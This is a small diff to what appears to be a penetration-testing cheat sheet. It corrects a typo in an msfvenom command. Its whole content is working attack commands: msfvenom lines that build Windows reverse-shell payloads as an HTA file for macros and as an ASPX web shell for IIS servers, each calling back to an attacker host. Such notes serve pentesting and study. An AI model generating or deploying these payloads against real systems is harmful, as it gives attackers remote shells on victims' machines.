@@ -169,7 +169,7 @@ ___
     # HTA attack (can be used in Macros)
     msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o evil.hta
     # ASPX (IIS for example if PUT is allowed)
-    fvenom -p windows/shell_reverse_tcp -f aspx LHOST=$(vpnip) LPORT=1234 -o shell.aspx
+    msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=$(vpnip) LPORT=1234 -o shell.aspx
     ```
     
     - `-e <ENCODER> -i <NUMBER OF ITERATIONS>`
